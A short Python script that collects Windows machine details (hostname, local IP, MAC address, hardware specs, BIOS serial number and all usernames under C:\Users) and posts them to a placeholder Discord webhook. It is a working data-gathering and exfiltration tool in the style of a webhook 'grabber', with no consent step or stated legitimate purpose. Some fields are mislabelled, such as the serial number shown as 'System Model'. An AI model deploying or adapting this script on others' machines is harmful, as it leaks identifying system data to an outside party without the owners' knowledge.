import requests
import socket
import platform
import psutil
import wmi
import os

# Replace with your Discord webhook URL
webhook_url = 'YOUR WEBHOOK UWU'

# Get PC Name (Hostname)
hostname = socket.gethostname()

# Get IP Address
local_ip = socket.gethostbyname(hostname)

# Define a port (replace with your actual port if necessary)
port = '8080'  # Example port

# Get hardware information using wmi
c = wmi.WMI()
bios_info = c.Win32_BIOS()[0]
cpu_info = c.Win32_Processor()[0]
os_info = c.Win32_OperatingSystem()[0]
disk_info = c.Win32_DiskDrive()[0]
gpu_info = c.Win32_VideoController()[0]
network_adapter = c.Win32_NetworkAdapterConfiguration(IPEnabled=True)[0]

# Get CPU, RAM, and Disk info using psutil
memory_info = psutil.virtual_memory()
disk_usage = psutil.disk_usage('/')

# Convert disk size to an integer
disk_size_gb = round(int(disk_info.Size) / (1024 ** 3), 2)

# Get all usernames
usernames = []
for user in os.listdir('C:\\Users'):
    if os.path.isdir(os.path.join('C:\\Users', user)):
        usernames.append(user)

# Prepare the embed message
embed = {
    "title": "System Information",
    "color": 0x7289DA,  # You can change the color as needed
    "fields": [
        {"name": "PC Name", "value": hostname, "inline": False},
        {"name": "Operating System", "value": os_info.Caption, "inline": False},
        {"name": "CPU", "value": cpu_info.Name, "inline": False},
        {"name": "Total RAM", "value": f"{round(memory_info.total / (1024 ** 3), 2)} GB", "inline": False},
        {"name": "Disk Size", "value": f"{disk_size_gb} GB", "inline": False},
        {"name": "Disk Usage", "value": f"{round(disk_usage.total / (1024 ** 3), 2)} GB", "inline": False},
        {"name": "GPU", "value": gpu_info.Name, "inline": False},
        {"name": "IP Address", "value": local_ip, "inline": False},
        {"name": "MAC Address", "value": network_adapter.MACAddress, "inline": False},
        {"name": "Port", "value": port, "inline": False},
        {"name": "BIOS Version", "value": bios_info.SMBIOSBIOSVersion, "inline": False},
        {"name": "System Manufacturer", "value": bios_info.Manufacturer, "inline": False},
        {"name": "System Model", "value": bios_info.SerialNumber, "inline": False},
        {"name": "Usernames", "value": ', '.join(usernames), "inline": False},
    ]
}

# Send the embed message to the Discord webhook
response = requests.post(webhook_url, json={"embeds": [embed]})

# Check for successful request
if response.status_code == 204:
    print("Message sent successfully.")
else:
    print(f"Failed to send message. Status code: {response.status_code}")
